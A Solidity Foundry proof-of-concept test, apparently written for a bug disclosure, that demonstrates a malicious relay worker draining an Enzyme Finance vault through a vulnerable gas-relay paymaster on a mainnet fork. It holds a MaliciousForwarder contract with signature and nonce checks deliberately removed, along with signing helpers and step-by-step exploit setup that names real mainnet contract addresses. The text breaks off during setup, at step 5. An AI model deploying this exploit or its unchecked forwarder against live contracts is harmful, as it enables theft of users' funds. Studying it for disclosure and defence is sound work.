//SPDX-License-Identifer:UNLICENSED
pragma solidity 0.8.10;
import "forge-std/Test.sol";
import "../../src/interfaces/IWETH.sol";
import "@opengsn/src/BaseRelayRecipient.sol";
import "@openzeppelin/contracts/utils/introspection/ERC165.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";


//****************************** INTERFACES *****************************/
interface IGasRelayPaymasterLib {

    struct ForwardRequest {
        address from;
        address to;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
        uint256 validUntil;
    }

    struct GasAndDataLimits {
        uint256 acceptanceBudget;
        uint256 preRelayedCallGasLimit;
        uint256 postRelayedCallGasLimit;
        uint256 calldataSizeLimit;
    }

    struct RelayData {
        uint256 gasPrice;
        uint256 pctRelayFee;
        uint256 baseRelayFee;
        address relayWorker;
        address paymaster;
        address forwarder;
        bytes paymasterData;
        uint256 clientId;
    }

    struct RelayRequest {
        ForwardRequest request;
        RelayData relayData;
    }

    function deposit() external;
    function getGasAndDataLimits() external view returns (GasAndDataLimits memory limits_);
    function getHubAddr() external view returns (address relayHub_);
    function getParentComptroller() external view returns (address parentComptroller_);
    function getParentVault() external view returns (address parentVault_);
    function getRelayHubDeposit() external view returns (uint256 depositBalance_);
    function getWethToken() external view returns (address wethToken_);
    function init(address _vault) external;
    function postRelayedCall(bytes memory _context, bool _success, uint256, RelayData memory _relayData) external;
    function preRelayedCall(RelayRequest memory _relayRequest, bytes memory, bytes memory, uint256)
        external
        returns (bytes memory context_, bool rejectOnRecipientRevert_);
    function trustedForwarder() external view returns (address trustedForwarder_);
    function versionPaymaster() external view returns (string memory versionString_);
    function withdrawBalance() external;
}
interface IRelayHub {
    event Deposited(address indexed paymaster, address indexed from, uint256 amount);
    event HubDeprecated(uint256 fromBlock);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event RelayHubConfigured(RelayHubConfig config);
    event RelayServerRegistered(
        address indexed relayManager, uint256 baseRelayFee, uint256 pctRelayFee, string relayUrl
    );
    event RelayWorkersAdded(address indexed relayManager, address[] newRelayWorkers, uint256 workersCount);
    event TransactionRejectedByPaymaster(
        address indexed relayManager,
        address indexed paymaster,
        address indexed from,
        address to,
        address relayWorker,
        bytes4 selector,
        uint256 innerGasUsed,
        bytes reason
    );
    event TransactionRelayed(
        address indexed relayManager,
        address indexed relayWorker,
        address indexed from,
        address to,
        address paymaster,
        bytes4 selector,
        uint8 status,
        uint256 charge
    );
    event TransactionResult(uint8 status, bytes returnValue);
    event Withdrawn(address indexed account, address indexed dest, uint256 amount);

/// Reason error codes for the TransactionRelayed event
    /// @param OK - the transaction was successfully relayed and execution successful - never included in the event
    /// @param RelayedCallFailed - the transaction was relayed, but the relayed call failed
    /// @param RejectedByPreRelayed - the transaction was not relayed due to preRelatedCall reverting
    /// @param RejectedByForwarder - the transaction was not relayed due to forwarder check (signature,nonce)
    /// @param PostRelayedFailed - the transaction was relayed and reverted due to postRelatedCall reverting
    /// @param PaymasterBalanceChanged - the transaction was relayed and reverted due to the paymaster balance change
    enum RelayCallStatus {
        OK,
        RelayedCallFailed,
        RejectedByPreRelayed,
        RejectedByForwarder,
        RejectedByRecipientRevert,
        PostRelayedFailed,
        PaymasterBalanceChanged
    }


    struct RelayData {
        uint256 gasPrice;
        uint256 pctRelayFee;
        uint256 baseRelayFee;
        address relayWorker;
        address paymaster;
        address forwarder;
        bytes paymasterData;
        uint256 clientId;
    }

    struct RelayRequest {
        ForwardRequest request;
        RelayData relayData;
    }

    struct ForwardRequest {
        address from;
        address to;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
        uint256 validUntil;
    }

    struct GasAndDataLimits {
        uint256 acceptanceBudget;
        uint256 preRelayedCallGasLimit;
        uint256 postRelayedCallGasLimit;
        uint256 calldataSizeLimit;
    }

    struct RelayHubConfig {
        uint256 maxWorkerCount;
        uint256 gasReserve;
        uint256 postOverhead;
        uint256 gasOverhead;
        uint256 maximumRecipientDeposit;
        uint256 minimumUnstakeDelay;
        uint256 minimumStake;
        uint256 dataGasCostPerByte;
        uint256 externalCallDataCostOverhead;
    }

    function G_NONZERO() external view returns (uint256);
    function addRelayWorkers(address[] memory newRelayWorkers) external;
    function balanceOf(address target) external view returns (uint256);
    function calculateCharge(uint256 gasUsed, RelayData memory relayData) external view returns (uint256);
    function calldataGasCost(uint256 length) external view returns (uint256);
    function depositFor(address target) external payable;
    function deprecateHub(uint256 fromBlock) external;
    function deprecationBlock() external view returns (uint256);
    function getConfiguration() external view returns (RelayHubConfig memory);
    function innerRelayCall(
        RelayRequest memory relayRequest,
        bytes memory signature,
        bytes memory approvalData,
        GasAndDataLimits memory gasAndDataLimits,
        uint256 totalInitialGas,
        uint256 maxPossibleGas
    ) external returns (uint8, bytes memory);
    function isDeprecated() external view returns (bool);
    function isRelayManagerStaked(address relayManager) external view returns (bool);
    function owner() external view returns (address);
    function penalize(address relayWorker, address beneficiary) external;
    function penalizer() external view returns (address);
    function registerRelayServer(uint256 baseRelayFee, uint256 pctRelayFee, string memory url) external;
    function relayCall(
        uint256 maxAcceptanceBudget,
        RelayRequest memory relayRequest,
        bytes memory signature,
        bytes memory approvalData,
        uint256 externalGasLimit
    ) external returns (bool paymasterAccepted, bytes memory returnValue);
    function renounceOwnership() external;
    function setConfiguration(RelayHubConfig memory _config) external;
    function stakeManager() external view returns (address);
    function transferOwnership(address newOwner) external;
    function versionHub() external view returns (string memory);
    function withdraw(uint256 amount, address dest) external;
    function workerCount(address) external view returns (uint256);
    function workerToManager(address) external view returns (address);
}
interface IForwarder is IERC165 {

    /**
     * @notice A representation of a request for a `Forwarder` to send `data` on behalf of a `from` to a target (`to`).
     */
    struct ForwardRequest {
        address from;
        address to;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
        uint256 validUntilTime;
    }

    event DomainRegistered(bytes32 indexed domainSeparator, bytes domainValue);

    event RequestTypeRegistered(bytes32 indexed typeHash, string typeStr);

    /**
     * @param from The address of a sender.
     * @return The nonce for this address.
     */
    function getNonce(address from)
    external view
    returns(uint256);

    /**
     * @notice Verify the transaction is valid and can be executed.
     * Implementations must validate the signature and the nonce of the request are correct.
     * Does not revert and returns successfully if the input is valid.
     * Reverts if any validation has failed. For instance, if either signature or nonce are incorrect.
     * Reverts if `domainSeparator` or `requestTypeHash` are not registered as well.
     */
    function verify(
        ForwardRequest calldata forwardRequest,
        bytes32 domainSeparator,
        bytes32 requestTypeHash,
        bytes calldata suffixData,
        bytes calldata signature
    ) external view;

    /**
     * @notice Executes a transaction specified by the `ForwardRequest`.
     * The transaction is first verified and then executed.
     * The success flag and returned bytes array of the `CALL` are returned as-is.
     *
     * This method would revert only in case of a verification error.
     *
     * All the target errors are reported using the returned success flag and returned bytes array.
     *
     * @param forwardRequest All requested transaction parameters.
     * @param domainSeparator The domain used when signing this request.
     * @param requestTypeHash The request type used when signing this request.
     * @param suffixData The ABI-encoded extension data for the current `RequestType` used when signing this request.
     * @param signature The client signature to be validated.
     *
     * @return success The success flag of the underlying `CALL` to the target address.
     * @return ret The byte array returned by the underlying `CALL` to the target address.
     */
    function execute(
        ForwardRequest calldata forwardRequest,
        bytes32 domainSeparator,
        bytes32 requestTypeHash,
        bytes calldata suffixData,
        bytes calldata signature
    )
    external payable
    returns (bool success, bytes memory ret);

    /**
     * @notice Register a new Request typehash.
     *
     * @notice This is necessary for the Forwarder to be able to verify the signatures conforming to the ERC-712.
     *
     * @param typeName The name of the request type.
     * @param typeSuffix Any extra data after the generic params. Must contain add at least one param.
     * The generic ForwardRequest type is always registered by the constructor.
     */
    function registerRequestType(string calldata typeName, string calldata typeSuffix) external;

    /**
     * @notice Register a new domain separator.
     *
     * @notice This is necessary for the Forwarder to be able to verify the signatures conforming to the ERC-712.
     *
     * @notice The domain separator must have the following fields: `name`, `version`, `chainId`, `verifyingContract`.
     * The `chainId` is the current network's `chainId`, and the `verifyingContract` is this Forwarder's address.
     * This method accepts the domain name and version to create and register the domain separator value.
     * @param name The domain's display name.
     * @param version The domain/protocol version.
     */
    function registerDomainSeparator(string calldata name, string calldata version) external;
}
interface IVault {
    function canRelayCalls(address) external view returns (bool);
    function getOwner() external view returns (address owner_);
    function getCreator() external view returns (address creator_);    
    function setAccessor(address _nextAccessor) external;
    function addAssetManagers(address[] calldata _managers) external;
    function getAccessor() external view returns (address accessor_);
    function withdrawAssetTo(address, address, uint256) external;    

}
interface IStakeManager {

    /// Emitted when a stake or unstakeDelay are initialized or increased
    event StakeAdded(
        address indexed relayManager,
        address indexed owner,
        uint256 stake,
        uint256 unstakeDelay
    );

    /// Emitted once a stake is scheduled for withdrawal
    event StakeUnlocked(
        address indexed relayManager,
        address indexed owner,
        uint256 withdrawBlock
    );

    /// Emitted when owner withdraws relayManager funds
    event StakeWithdrawn(
        address indexed relayManager,
        address indexed owner,
        uint256 amount
    );

    /// Emitted when an authorized Relay Hub penalizes a relayManager
    event StakePenalized(
        address indexed relayManager,
        address indexed beneficiary,
        uint256 reward
    );

    event HubAuthorized(
        address indexed relayManager,
        address indexed relayHub
    );

    event HubUnauthorized(
        address indexed relayManager,
        address indexed relayHub,
        uint256 removalBlock
    );

    event OwnerSet(
        address indexed relayManager,
        address indexed owner
    );

    /// @param stake - amount of ether staked for this relay
    /// @param unstakeDelay - number of blocks to elapse before the owner can retrieve the stake after calling 'unlock'
    /// @param withdrawBlock - first block number 'withdraw' will be callable, or zero if the unlock has not been called
    /// @param owner - address that receives revenue and manages relayManager's stake
    struct StakeInfo {
        uint256 stake;
        uint256 unstakeDelay;
        uint256 withdrawBlock;
        address payable owner;
    }

    struct RelayHubInfo {
        uint256 removalBlock;
    }

    /// Set the owner of a Relay Manager. Called only by the RelayManager itself.
    /// Note that owners cannot transfer ownership - if the entry already exists, reverts.
    /// @param owner - owner of the relay (as configured off-chain)
    function setRelayManagerOwner(address payable owner) external;

    /// Only the owner can call this function. If the entry does not exist, reverts.
    /// @param relayManager - address that represents a stake entry and controls relay registrations on relay hubs
    /// @param unstakeDelay - number of blocks to elapse before the owner can retrieve the stake after calling 'unlock'
    function stakeForRelayManager(address relayManager, uint256 unstakeDelay) external payable;

    function unlockStake(address relayManager) external;

    function withdrawStake(address relayManager) external;

    function authorizeHubByOwner(address relayManager, address relayHub) external;

    function authorizeHubByManager(address relayHub) external;

    function unauthorizeHubByOwner(address relayManager, address relayHub) external;

    function unauthorizeHubByManager(address relayHub) external;

    function isRelayManagerStaked(address relayManager, address relayHub, uint256 minAmount, uint256 minUnstakeDelay)
    external
    view
    returns (bool);

    /// Slash the stake of the relay relayManager. In order to prevent stake kidnapping, burns half of stake on the way.
    /// @param relayManager - entry to penalize
    /// @param beneficiary - address that receives half of the penalty amount
    /// @param amount - amount to withdraw from stake
    function penalizeRelayManager(address relayManager, address payable beneficiary, uint256 amount) external;

    function getStakeInfo(address relayManager) external view returns (StakeInfo memory stakeInfo);

    function maxUnstakeDelay() external view returns (uint256);

    function versionSM() external view returns (string memory);
}
interface IGasRelayPaymasterFactory{

    function getOwner() external view returns (address owner_);
     function getCanonicalLib() external view returns(address canonicalLib_);
    function setCanonicalLib(address _nextCanonicalLib) external;
    function deployProxy(bytes memory _constructData) external returns (address proxy_);
}
interface GsnTypes {
    /// @notice gasPrice, pctRelayFee and baseRelayFee must be validated inside of the paymaster's preRelayedCall in order not to overpay
    struct RelayData {
        uint256 gasPrice;
        uint256 pctRelayFee;
        uint256 baseRelayFee;
        address relayWorker;
        address paymaster;
        address forwarder;
        bytes paymasterData;
        uint256 clientId;
    }

    //note: must start with the ForwardRequest to be an extension of the generic forwarder
    struct RelayRequest {
        IForwarder.ForwardRequest request;
        RelayData relayData;
    }
}

//-----------------------------------------------------------------------------/

//****************************** MOCK & MALICIOUS CONTRACTS *****************************/

contract MaliciousForwarder is IForwarder, ERC165{
        using ECDSA for bytes32;

    address private constant DRY_RUN_ADDRESS = 0x0000000000000000000000000000000000000000;

    string public constant GENERIC_PARAMS = "address from,address to,uint256 value,uint256 gas,uint256 nonce,bytes data,uint256 validUntilTime";

    string public constant EIP712_DOMAIN_TYPE = "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)";

    mapping(bytes32 => bool) public typeHashes;
    mapping(bytes32 => bool) public domains;

    // Nonces of senders, used to prevent replay attacks
    mapping(address => uint256) private nonces;

    // solhint-disable-next-line no-empty-blocks
    receive() external payable {}

    /// @inheritdoc IForwarder
    function getNonce(address from)
    public view override
    returns (uint256) {
        return nonces[from];
    }

    constructor() {
        string memory requestType = string(abi.encodePacked("ForwardRequest(", GENERIC_PARAMS, ")"));
        registerRequestTypeInternal(requestType);
    }

    /// @inheritdoc IERC165
    function supportsInterface(bytes4 interfaceId) public view virtual override(IERC165, ERC165) returns (bool) {
        return interfaceId == type(IForwarder).interfaceId ||
            super.supportsInterface(interfaceId);
    }

    /// @inheritdoc IForwarder
    function verify(
        ForwardRequest calldata req,
        bytes32 domainSeparator,
        bytes32 requestTypeHash,
        bytes calldata suffixData,
        bytes calldata sig)
    external override view {
        //@audit malicious forwarder simply accepts any request
        
        // _verifyNonce(req);
        // _verifySig(req, domainSeparator, requestTypeHash, suffixData, sig);
    }

    /// @inheritdoc IForwarder
    function execute(
        ForwardRequest calldata req,
        bytes32 domainSeparator,
        bytes32 requestTypeHash,
        bytes calldata suffixData,
        bytes calldata sig
    )
    external payable
    override
    returns (bool success, bytes memory ret) {
         //@audit removing all verifications from execute   
        // _verifySig(req, domainSeparator, requestTypeHash, suffixData, sig);
        // _verifyAndUpdateNonce(req);

        require(req.validUntilTime == 0 || req.validUntilTime > block.timestamp, "FWD: request expired");

        uint256 gasForTransfer = 0;
        if ( req.value != 0 ) {
            gasForTransfer = 40000; //buffer in case we need to move eth after the transaction.
        }
        bytes memory callData = abi.encodePacked(req.data, req.from);
        require(gasleft()*63/64 >= req.gas + gasForTransfer, "FWD: insufficient gas");
        // solhint-disable-next-line avoid-low-level-calls
        (success,ret) = req.to.call{gas : req.gas, value : req.value}(callData);

        // #if ENABLE_CONSOLE_LOG
        console.log("execute result: success: %s ret:", success);
        console.logBytes(ret);
        // #endif

        if ( req.value != 0 && address(this).balance>0 ) {
            // can't fail: req.from signed (off-chain) the request, so it must be an EOA...
            payable(req.from).transfer(address(this).balance);
        }

        return (success,ret);
    }

    function _verifyNonce(ForwardRequest calldata req) internal view {
        require(nonces[req.from] == req.nonce, "FWD: nonce mismatch");
    }

    function _verifyAndUpdateNonce(ForwardRequest calldata req) internal {
        require(nonces[req.from]++ == req.nonce, "FWD: nonce mismatch");
    }

    /// @inheritdoc IForwarder
    function registerRequestType(string calldata typeName, string calldata typeSuffix) external override {

        for (uint256 i = 0; i < bytes(typeName).length; i++) {
            bytes1 c = bytes(typeName)[i];
            require(c != "(" && c != ")", "FWD: invalid typename");
        }

        string memory requestType = string(abi.encodePacked(typeName, "(", GENERIC_PARAMS, ",", typeSuffix));
        registerRequestTypeInternal(requestType);
    }

    /// @inheritdoc IForwarder
    function registerDomainSeparator(string calldata name, string calldata version) external override {
        uint256 chainId;
        /* solhint-disable-next-line no-inline-assembly */
        assembly { chainId := chainid() }

        bytes memory domainValue = abi.encode(
            keccak256(bytes(EIP712_DOMAIN_TYPE)),
            keccak256(bytes(name)),
            keccak256(bytes(version)),
            chainId,
            address(this));

        bytes32 domainHash = keccak256(domainValue);

        domains[domainHash] = true;
        emit DomainRegistered(domainHash, domainValue);
    }

    function registerRequestTypeInternal(string memory requestType) internal {

        bytes32 requestTypehash = keccak256(bytes(requestType));
        typeHashes[requestTypehash] = true;
        emit RequestTypeRegistered(requestTypehash, requestType);
    }

    function _verifySig(
        ForwardRequest calldata req,
        bytes32 domainSeparator,
        bytes32 requestTypeHash,
        bytes calldata suffixData,
        bytes calldata sig)
    internal
    virtual
    view
    {
        require(domains[domainSeparator], "FWD: unregistered domain sep.");
        require(typeHashes[requestTypeHash], "FWD: unregistered typehash");
        bytes32 digest = keccak256(abi.encodePacked(
                "\x19\x01", domainSeparator,
                keccak256(_getEncoded(req, requestTypeHash, suffixData))
            ));
        // solhint-disable-next-line avoid-tx-origin
        require(tx.origin == DRY_RUN_ADDRESS || digest.recover(sig) == req.from, "FWD: signature mismatch");
    }

    /**
     * @notice Creates a byte array that is a valid ABI encoding of a request of a `RequestType` type. See `execute()`.
     */
    function _getEncoded(
        ForwardRequest calldata req,
        bytes32 requestTypeHash,
        bytes calldata suffixData
    )
    public
    pure
    returns (
        bytes memory
    ) {
        // we use encodePacked since we append suffixData as-is, not as dynamic param.
        // still, we must make sure all first params are encoded as abi.encode()
        // would encode them - as 256-bit-wide params.
        return abi.encodePacked(
            requestTypeHash,
            uint256(uint160(req.from)),
            uint256(uint160(req.to)),
            req.value,
            req.gas,
            req.nonce,
            keccak256(req.data),
            req.validUntilTime,
            suffixData
        );
    }
}

contract MockComptroller is BaseRelayRecipient{
    
    event callOnExtensionExecuted();    
    address gasRelayPaymaster;
    address vault;
    address private immutable WETH_TOKEN;

   modifier onlyGasRelayPaymaster() {
        __assertIsGasRelayPaymaster();
        _;
    }
    function __assertIsGasRelayPaymaster() private view {
        require(msg.sender == getGasRelayPaymaster(), "Only Gas Relay Paymaster callable");
    }

    uint256 private counter; //counter that gets updated every time execution is successful
    constructor(address forwarder, address _weth) {
        _setTrustedForwarder(forwarder); //-n sets a forwarder
        WETH_TOKEN = _weth;
    }


    // dummy function executed
    // Function mocks the exact function in ComptrollerLib
    // See here: https://github.com/enzymefinance/protocol/blob/5ef5bf07f284328c67acec7e5248fef8d212458f/contracts/release/core/fund/comptroller/ComptrollerLib.sol#L218
    // function selector matches this name

    // In this mock implementation - simply emitting an event and simply incrementing counter
    function callOnExtension(address, uint256, bytes memory) external {
            emit callOnExtensionExecuted();
            counter++;
            console.log("call on extension executed");
            console.log("new counter", counter);
        }
    function pullWethForGasRelayer(uint256 _amount) external onlyGasRelayPaymaster {
            IVault(getVaultProxy()).withdrawAssetTo(getWethToken(), getGasRelayPaymaster(), _amount);
        }
        
        function versionRecipient() external override view returns (string memory){
            return "";
        }

        function getCounter() public view returns(uint256){
            return counter;
        }

        function getGasRelayPaymaster() public view  returns (address gasRelayPaymaster_) {
            return gasRelayPaymaster;
        }

        function setGasRelayPaymaster(address _paymaster) external { // dummy functions created to run the code
            gasRelayPaymaster = _paymaster;
        }

        function setVault(address _vault) external{
            vault = _vault;
        }

        function getVaultProxy() public view returns(address){
            return vault;
        }

        function getWethToken() public view returns (address wethToken_) {
            return WETH_TOKEN;
        }

    
}
//-----------------------------------------------------------------------------/

//****************************** HELPER CONTRACTS *****************************/
contract EIP712Signature is Test {


    struct EIP712Domain {
        string name;
        string version;
        uint256 chainId;
        address verifyingContract;
    }

    // EIP712 Struct Hash
    bytes32 public constant EIP712DOMAIN_TYPEHASH = keccak256(
        "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
    );

    bytes32 private constant RELAY_REQUEST_TYPEHASH = keccak256(
        "RelayRequest(ForwardRequest request,RelayData relayData)"
    );

    string public constant GENERIC_PARAMS = "address from,address to,uint256 value,uint256 gas,uint256 nonce,bytes data,uint256 validUntil";

    bytes public constant RELAYDATA_TYPE = "RelayData(uint256 gasPrice,uint256 pctRelayFee,uint256 baseRelayFee,address relayWorker,address paymaster,address forwarder,bytes paymasterData,uint256 clientId)";
    bytes32 public constant RELAYDATA_TYPEHASH = keccak256(RELAYDATA_TYPE);

    string public constant RELAY_REQUEST_NAME = "RelayRequest";
    string public constant RELAY_REQUEST_SUFFIX = string(abi.encodePacked("RelayData relayData)", RELAYDATA_TYPE));

    bytes public constant RELAY_REQUEST_TYPE = abi.encodePacked(
        RELAY_REQUEST_NAME,"(",GENERIC_PARAMS,",", RELAY_REQUEST_SUFFIX);

    function hashDomain(EIP712Domain memory req) internal pure returns (bytes32) {
        return keccak256(abi.encode(
                EIP712DOMAIN_TYPEHASH,
                keccak256(bytes(req.name)),
                keccak256(bytes(req.version)),
                req.chainId,
                req.verifyingContract));
    }

    // EIP712 Domain Separator
    function domainSeparator(address forwarder) internal view returns (bytes32) {
        return hashDomain(EIP712Domain({
            name : "GSN Relayed Transaction",
            version : "2",
            chainId : getChainID(),
            verifyingContract : forwarder
            }));
    }

    function getChainID() internal view returns (uint256 id) {
        /* solhint-disable no-inline-assembly */
        assembly {
            id := chainid()
        }
    }

    function hashRelayData(IRelayHub.RelayData calldata req) internal pure returns (bytes32) {
        return keccak256(abi.encode(
                RELAYDATA_TYPEHASH,
                req.gasPrice,
                req.pctRelayFee,
                req.baseRelayFee,
                req.relayWorker,
                req.paymaster,
                req.forwarder,
                keccak256(req.paymasterData),
                req.clientId
            ));
    }

    function hashRelayDataTmp(GsnTypes.RelayData calldata req) internal pure returns (bytes32) {
        return keccak256(abi.encode(
                RELAYDATA_TYPEHASH,
                req.gasPrice,
                req.pctRelayFee,
                req.baseRelayFee,
                req.relayWorker,
                req.paymaster,
                req.forwarder,
                keccak256(req.paymasterData),
                req.clientId
            ));
    }

    function splitRequest(IRelayHub.RelayRequest calldata req)
    internal
    pure
    returns (
        bytes memory suffixData
    ) {
        suffixData = abi.encode(
            hashRelayData(req.relayData));
    }

    function splitRequestTmp(GsnTypes.RelayRequest calldata req)
    internal
    pure
    returns (
        bytes memory suffixData
    ) {
        suffixData = abi.encode(
            hashRelayDataTmp(req.relayData));
    }

    function signRelayRequest(uint256 signerPrivateKey, address forwarder, IRelayHub.RelayRequest calldata relayRequest) external view returns (bytes32, bytes memory) {
         (bytes memory suffixData) = splitRequest(relayRequest);
 
        bytes32 requestHash =   keccak256(_getEncoded(relayRequest.request, suffixData));
        bytes32 digest = keccak256(abi.encodePacked(
            "\x19\x01",
            domainSeparator(forwarder),
            requestHash
        ));
        bytes memory signature = generateSignature(signerPrivateKey, digest);
        return (digest, signature);
    }

    function signRelayRequestTmp(uint256 signerPrivateKey, address forwarder, GsnTypes.RelayRequest calldata relayRequest) external view returns (bytes32, bytes memory) {
         (bytes memory suffixData) = splitRequestTmp(relayRequest);
 
        bytes32 requestHash =   keccak256(_getEncodedTmp(relayRequest.request, suffixData));
        bytes32 digest = keccak256(abi.encodePacked(
            "\x19\x01",
            domainSeparator(forwarder),
            requestHash
        ));
        bytes memory signature = generateSignature(signerPrivateKey, digest);
        return (digest, signature);
    }

    function generateSignature(uint256 signerPrivateKey, bytes32 digest) private pure returns (bytes memory) {
        ( uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, digest);
        bytes memory signature = new bytes(65);
        assembly {
            mstore(add(signature, 32), r)
            mstore(add(signature, 64), s)
            mstore8(add(signature, 96), v)
        }
        return signature;
    }

 function _getEncoded(
        IRelayHub.ForwardRequest memory req,
        bytes memory suffixData
    )
    public
    pure
    returns (
        bytes memory
    ) {
        // we use encodePacked since we append suffixData as-is, not as dynamic param.
        // still, we must make sure all first params are encoded as abi.encode()
        // would encode them - as 256-bit-wide params.
        return abi.encodePacked(
            RELAY_REQUEST_TYPE,
            uint256(uint160(req.from)),
            uint256(uint160(req.to)),
            req.value,
            req.gas,
            req.nonce,
            keccak256(req.data),
            req.validUntil,
            suffixData
        );
    }

     function _getEncodedTmp(
        IForwarder.ForwardRequest memory req,
        bytes memory suffixData
    )
    public
    pure
    returns (
        bytes memory
    ) {
        // we use encodePacked since we append suffixData as-is, not as dynamic param.
        // still, we must make sure all first params are encoded as abi.encode()
        // would encode them - as 256-bit-wide params.
        return abi.encodePacked(
            RELAY_REQUEST_TYPE,
            uint256(uint160(req.from)),
            uint256(uint160(req.to)),
            req.value,
            req.gas,
            req.nonce,
            keccak256(req.data),
            req.validUntilTime,
            suffixData
        );
    }


     function ecrecoverSignature(bytes32 digest) private view returns (uint8, bytes32, bytes32) {
        uint8 v;
        bytes32 r;
        bytes32 s;
        assembly {
            let signaturePointer := mload(0x40)
            mstore(signaturePointer, digest)
            let success := staticcall(gas(), 0x01, signaturePointer, 0x20, signaturePointer, 0x60)
            if eq(success, 1) {
                v := byte(0, mload(add(signaturePointer, 0x20)))
                r := mload(add(signaturePointer, 0x21))
                s := mload(add(signaturePointer, 0x41))
            }
        }
        return (v, r, s);
     }

}
//----------------------------------------------------------------------------/



//****************************** MAIN POC *****************************/

//POC created by 0Kage
//twitter: @0kage_eth

// Objective: To demonstrate that a malicious relay worker can drain all funds from vault

// POC Steps:
/** Steps for exploiting the vulnerability
    0. Setup a mainnet fork indexed to a block number just before the vulnerability was reported
    1. Get the paymaster library that had the vulnerability from etherscan & get `relayHub` and `forwarder` addresses
    2. Setup a mock recipient (`MockComptroller`) contract -> this can receive msgs from GSN network
    3. Setup an attacker address (relay worker)& make sure relay worker is registered against a relay manager with enough stake
    4. Setup a custom malicious forwarder contract that will verify every message regardless of who signed it
    5. Setup a new vault - here we used an existing vault already deployed on mainnet
    6. Change the Beacon of the existing GsnPaymasterFactory to the vulnerable paymaster library of step 1
    6.1 Deploy a PaymasterProxy and assign the vault address to the vault in Step 5
    7. Fund paymaster with 0.2 Ether and make a deposit to the RelayHub
    8. Craft a relay request with paymasterData is true, high value for pctRelayFee
    9. Relay worker signs the relay request
    10. Send request via relayHub::relayCall
    11. Check balances and notice that vault balance has decreased and relay worker (attacker) balance in relayhub increases
 */
contract EnzymeFinancePOC is Test{

    uint256 private mainnetFork;
    IRelayHub private relayHub;
    IGasRelayPaymasterFactory private paymasterFactory;
    IGasRelayPaymasterLib private paymaster;
    MockComptroller private mockComptroller;
    IStakeManager private stakeManager;
    IForwarder private maliciousForwarder;
    IForwarder private trustedForwarder;
    IVault private vault;
    uint256 constant RELAYWORKER_PRIVATE_KEY = 123124334455;
    uint256 constant ASSETMANAGER_PRIVATE_KEY = 999999999999;

    address maliciousRelayWorker = vm.addr(RELAYWORKER_PRIVATE_KEY); // malicious relay worker
    uint256 msgNonce;
    address mockAssetManager; // asset manager we will emulate without permission (ie. we don't need his sign)

    //GasRelayPaymasterLib contract deployed by Enzyme finance
    // https://etherscan.io/address/0x08CB94f7101F4205F5E8590518B65935AbF490f8#code
    address private constant PAYMASTER_LIB = 0x08CB94f7101F4205F5E8590518B65935AbF490f8;
    address private constant VAULT = 0x891dee0483eBAA922E274ddD2eBBaA2D33468A38;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; 
    address private constant PAYMASTER_BEACON_FACTORY = 0x846bbe1925047023651de7EC289f329c24ded3a8;

    function setUp() external{

        //STEP 0 -> Setup Mainnet Fork
        console.log("--------------------------------------------------");            
        console.log("****** STEP 0: Mainnet Fork*********");
        // issue was reported on 28 March -> picked a block before announcement
        string memory mainnetRpcUrl = vm.envString("MAINNET_RPC_URL");
        uint256 blockNumber = 16890110; // block number corresponds to 24 Mar
        mainnetFork = vm.createFork(mainnetRpcUrl, 16890110); 
        vm.selectFork(mainnetFork);
        emit log_named_uint("Mainnet fork deployed at block number:", blockNumber);
        console.log("---------------STEP 0 COMPLETE---------------------");
        console.log("--------------------------------------------------");


        //STEP 1 -> Setup paymaster, relayhub and trustedForwarder contracts using mainnet address            
        console.log("****** STEP 1: RelayHub and Trust Forwarder setup *********");
       
        // emit log_named_address("paymaster address", address(paymaster));
        address relayHubAddress = IGasRelayPaymasterLib(PAYMASTER_LIB).getHubAddr();
        address trustedForwarderAddress = IGasRelayPaymasterLib(PAYMASTER_LIB).trustedForwarder();

        // emit log_named_address("Paymaster Address", address(paymaster));
        emit log_named_address("Relay Hub Address", relayHubAddress);
        emit log_named_address("Trusted Forwarder Address", trustedForwarderAddress);        

        relayHub = IRelayHub(relayHubAddress);
        // this is the forwarder stored inside paymaster 
        // Ideally, this forwarder should match forwarder address stored inside recipient contract
        trustedForwarder = IForwarder(IGasRelayPaymasterLib(PAYMASTER_LIB).trustedForwarder());  
       console.log("---------------STEP 1 COMPLETE---------------------");
       console.log("--------------------------------------------------");


        //STEP 2 -> Setup a dummy recipient contract -> I'm not using recipient contract used by Enzyme Vaults       
        // point here is to only prove that malicious relay workers can execute a message on recipient contract
        // and then drain paymaster for their services -> to this extent, it does not matter what the actual recipient contract is
        // Note that recipient will be controlled by Enzyme finance vault
        // I've setup a dummy recipient that has a trusted forwarder stored
        console.log("****** STEP 2: Setup a Dummy Recipient Contract that interacts with GSN *********");
        mockComptroller = MockComptroller(address(new MockComptroller(address(trustedForwarder), WETH)));         
        emit log_named_address("Mock Comptroller (Recipient) Address", address(mockComptroller));
       console.log("---------------STEP 2 COMPLETE---------------------");
       console.log("--------------------------------------------------");



        // STEP 3 -> Setup relay worker (attacker)
        console.log("****** STEP 3: Setup relay worker and register with relay manager *********");
        stakeManager = IStakeManager(relayHub.stakeManager());
        IRelayHub.RelayHubConfig memory hubConfig = relayHub.getConfiguration();
        (address relayManager, address relayManagerOwner) = _setupRelayWorkerAndManager(maliciousRelayWorker, hubConfig.minimumStake, hubConfig.minimumUnstakeDelay);
        emit log_named_address("Malicious Relay Worker", address(maliciousRelayWorker));
        emit log_named_address("Stake Manager", address(stakeManager));
        emit log_named_address("Relay Manager", relayManager);
        emit log_named_address("Relay Manager Owner", relayManagerOwner);
        console.log("---------------STEP 3 COMPLETE---------------------");
        console.log("--------------------------------------------------");



       // STEP 4 -> Setup custom malicious forwarder
        console.log("****** STEP 4: Setup custom malicious forwarder contract *********");
        maliciousForwarder = IForwarder(address(new MaliciousForwarder()));
        emit log_named_address("Malicious Forwarder Address", address(maliciousForwarder));         
        console.log("---------------STEP 4 COMPLETE---------------------");        
        console.log("--------------------------------------------------");

        // setting message nonce to 1
        // increase by 1 every time there was a successful execution
        msgNonce = 1;


        // STEP 5 -> Modify vault so that vault owner we created has permission to relay
        console.log("****** STEP 5: Configure vault *********");        
